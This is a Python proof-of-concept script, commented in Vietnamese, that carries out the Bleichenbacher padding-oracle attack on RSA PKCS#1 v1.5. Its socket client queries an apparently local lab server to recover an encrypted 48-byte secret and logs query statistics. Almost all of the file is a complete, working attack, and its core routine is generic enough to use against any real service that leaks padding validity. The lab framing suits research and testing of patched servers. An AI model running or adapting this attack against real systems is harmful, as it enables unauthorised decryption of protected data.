import socket
import sys
import os
import logging
import time
from dataclasses import dataclass
from random import randrange

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Random import get_random_bytes

# --- 1. CÁC HÀM TIỆN ÍCH ---

def ceil_div(a, b):
    """Tính (a / b) làm tròn lên"""
    return (a + b - 1) // b


def floor_div(a, b):
    """Tính (a / b) làm tròn xuống"""
    return a // b


def _insert(M, a, b):
    """Hợp nhất các khoảng (intervals)"""
    for i, (a_, b_) in enumerate(M):
        if a_ <= b and a <= b_:
            a = min(a, a_)
            b = max(b, b_)
            M[i] = (a, b)
            return
    M.append((a, b))


@dataclass
class OracleStats:
    queries: int = 0
    ok: int = 0
    fail: int = 0
    socket_errors: int = 0
    t_start: float = 0.0
    t_end: float = 0.0

    def begin(self):
        self.t_start = time.perf_counter()

    def end(self):
        self.t_end = time.perf_counter()

    @property
    def elapsed(self) -> float:
        return max(0.0, self.t_end - self.t_start)

    @property
    def avg_time_per_query(self) -> float:
        return self.elapsed / self.queries if self.queries else 0.0

    @property
    def qps(self) -> float:
        return (self.queries / self.elapsed) if self.elapsed > 0 else 0.0


# --- 2. LOGIC TẤN CÔNG ---
# Đây là toàn bộ thuật toán Bleichenbacher '98

# Step 1. Blinding
def _step_1(padding_oracle, n, e, c):
    s0 = 1
    c0 = c
    logging.info("Step 1: Blinding - Đang tìm bản tin PKCS conforming đầu tiên...")
    i = 0
    while not padding_oracle(c0):
        i += 1
        if i % 100 == 0:
            logging.info(f"Step 1: Blinding attempt {i}...")
        s0 = randrange(2, n)
        c0 = (c * pow(s0, e, n)) % n

    logging.info(f"Step 1: Blinding thành công sau {i+1} lần thử. s0 = {s0}")
    return s0, c0


# Step 2.a. Searching
def _step_2a(padding_oracle, n, e, c0, B):
    s = ceil_div(n, 3 * B)
    logging.info(f"Step 2.a: Bắt đầu tìm kiếm s1 >= {s}")
    while not padding_oracle((c0 * pow(s, e, n)) % n):
        s += 1
    logging.info(f"Step 2.a: Tìm thấy s1 = {s}")
    return s


# Step 2.b. Searching with more than one interval
def _step_2b(padding_oracle, n, e, c0, s):
    s += 1
    logging.info(f"Step 2.b: Đang tìm kiếm từ s = {s}")
    while not padding_oracle((c0 * pow(s, e, n)) % n):
        s += 1
    logging.info(f"Step 2.b: Tìm thấy s = {s}")
    return s


# Step 2.c. Searching with one interval left
def _step_2c(padding_oracle, n, e, c0, B, s, a, b):
    r = ceil_div(2 * (b * s - 2 * B), n)
    logging.info(f"Step 2.c: Bắt đầu tìm kiếm với r = {r}")
    while True:
        left = ceil_div(2 * B + r * n, b)
        right = floor_div(3 * B + r * n, a)
        for s_new in range(left, right + 1):
            if padding_oracle((c0 * pow(s_new, e, n)) % n):
                logging.info(f"Step 2.c: Tìm thấy s = {s_new}")
                return s_new
        r += 1


# Step 3. Narrowing the set of solutions
def _step_3(n, B, s, M):
    M_ = []
    logging.info(f"Step 3: Thu hẹp {len(M)} khoảng với s = {s}")
    for (a, b) in M:
        left = ceil_div(a * s - 3 * B + 1, n)
        right = floor_div(b * s - 2 * B, n)
        for r in range(left, right + 1):
            a_ = max(a, ceil_div(2 * B + r * n, s))
            b_ = min(b, floor_div(3 * B - 1 + r * n, s))
            if a_ <= b_:
                _insert(M_, a_, b_)
    logging.info(f"Step 3: Các khoảng mới: {M_}")
    return M_


def attack(padding_oracle, n, e, c):
    k = ceil_div(n.bit_length(), 8)
    B = 2 ** (8 * (k - 2))
    logging.info(f"k = {k} bytes, B = {B}")

    # Step 1
    s0, c0 = _step_1(padding_oracle, n, e, c)
    M = [(2 * B, 3 * B - 1)]

    # Step 2.a
    s = _step_2a(padding_oracle, n, e, c0, B)
    M = _step_3(n, B, s, M)
    i = 1
    if len(M) == 0:
        logging.error("Không có khoảng nào còn lại sau Step 2.a")
        return os._exit(1)
    while True:
        logging.info(f"--- Vòng lặp {i}, {len(M)} khoảng ---")
        logging.info(f"Các khoảng hiện tại: {M}")
        if len(M) > 1:
            s = _step_2b(padding_oracle, n, e, c0, s)
        else:
            (a, b) = M[0]
            if a == b:
                logging.info("Step 4: Đã tìm thấy giải pháp!")
                m = (a * pow(s0, -1, n)) % n
                return m
            s = _step_2c(padding_oracle, n, e, c0, B, s, a, b)

        M = _step_3(n, B, s, M)
        i += 1


# --- 3. LOGIC KẾT NỐI ---

def query_oracle(ciphertext_int, host, port, n_length_bytes, stats: OracleStats):
    # Chuyển số nguyên về bytes, đảm bảo đúng độ dài
    c_bytes = ciphertext_int.to_bytes(n_length_bytes, 'big')

    stats.queries += 1

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((host, port))
            s.sendall(c_bytes)
            response = s.recv(1024)
            ok = (response == b'OK')
            if ok:
                stats.ok += 1
            else:
                stats.fail += 1
            return ok
        except ConnectionRefusedError:
            logging.error("Lỗi: Không thể kết nối. Server oracle đã chạy chưa?")
            sys.exit(1)
        except Exception:
            stats.socket_errors += 1
            stats.fail += 1
            return False


# --- 4. HÀM MAIN ---
if __name__ == "__main__":
    # --- logging to console + file ---
    log_dir = os.getenv("LOG_DIR", "logs")
    os.makedirs(log_dir, exist_ok=True)
    log_path = os.path.join(log_dir, f"attackA_vuln_{time.strftime('%Y%m%d_%H%M%S')}.log")

    logger = logging.getLogger()
    logger.setLevel(logging.INFO)

    fmt = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

    ch = logging.StreamHandler(sys.stdout)
    ch.setFormatter(fmt)
    logger.addHandler(ch)

    fh = logging.FileHandler(log_path, mode="w", encoding="utf-8")
    fh.setFormatter(fmt)
    logger.addHandler(fh)

    logging.info(f"Logging to file: {log_path}")

    # --- Tải Public Key ---
    PUB_KEY_PATH = "poc/Bleichenbacher/public.pem"
    try:
        pub_key = RSA.import_key(open(PUB_KEY_PATH, "rb").read())
    except FileNotFoundError:
        logging.error(f"Lỗi: Không tìm thấy public key tại '{PUB_KEY_PATH}'")
        logging.error("Bạn đã chạy server (docker/tls_like_server/server.py) để tạo key chưa?")
        sys.exit(1)

    n = pub_key.n
    e = pub_key.e
    k = ceil_div(n.bit_length(), 8)  # byte-length modulus

    # --- Tạo một bản tin để giải mã ---
    # TLS-like demo: 48 bytes
    plaintext = get_random_bytes(48)
    assert len(plaintext) == 48

    cipher_rsa = PKCS1_v1_5.new(pub_key)
    c_bytes = cipher_rsa.encrypt(plaintext)
    c_int = int.from_bytes(c_bytes, 'big')
    logging.info("Đã tạo bản tin (ciphertext).")

    # --- Chuẩn bị Oracle ---
    HOST = os.getenv("ORACLE_HOST_PATCHED", "tls_like_server_patched") # server
    PORT = int(os.getenv("ORACLE_PORT_PATCHED", "1338"))

    stats = OracleStats()

    def oracle_wrapper(c_int_to_test):
        return query_oracle(c_int_to_test, HOST, PORT, k, stats)

    # --- BẮT ĐẦU TẤN CÔNG ---
    logging.info("Running Bleichenbacher attack...")
    stats.begin()
    m_int = attack(oracle_wrapper, n, e, c_int)
    stats.end()

    # --- Hiển thị kết quả ---
    logging.info("\n--- Attack successfullly! ---")

    m_bytes = m_int.to_bytes(k, 'big')

    recovered_plaintext = b""
    try:
        separator_idx = m_bytes.index(b'\x00', 2)
        recovered_plaintext = m_bytes[separator_idx + 1:]

        logging.info(f"Plaintext gốc (hex):      {plaintext.hex()}")
        logging.info(f"Plaintext phục hồi (hex): {recovered_plaintext.hex()}")

        assert recovered_plaintext == plaintext
        logging.info("Xác minh: Thành công! Bản tin phục hồi khớp với bản tin gốc.")

    except Exception as ex:
        logging.error(f"Không thể parse/verify plaintext từ bytes: {ex}")
        logging.warning(f"Plaintext (dạng số): {m_int}")
        logging.warning(f"Plaintext (dạng bytes thô, hex): {m_bytes.hex()}")
        logging.warning(f"Bản tin gốc (hex): {plaintext.hex()}")
        if recovered_plaintext:
            logging.warning(f"Bản tin phục hồi (hex): {recovered_plaintext.hex()}")

    # --- Thống kê ---
    logging.info("=== THỐNG KÊ ATTACK ===")
    logging.info(f"Total oracle queries: {stats.queries}")
    logging.info(f"Oracle OK: {stats.ok} | FAIL: {stats.fail} | Socket errors: {stats.socket_errors}")
    logging.info(f"Total time: {stats.elapsed:.6f} seconds")
    logging.info(f"Avg time / query: {stats.avg_time_per_query:.6f} seconds")
    logging.info(f"Queries per second (QPS): {stats.qps:.2f}")
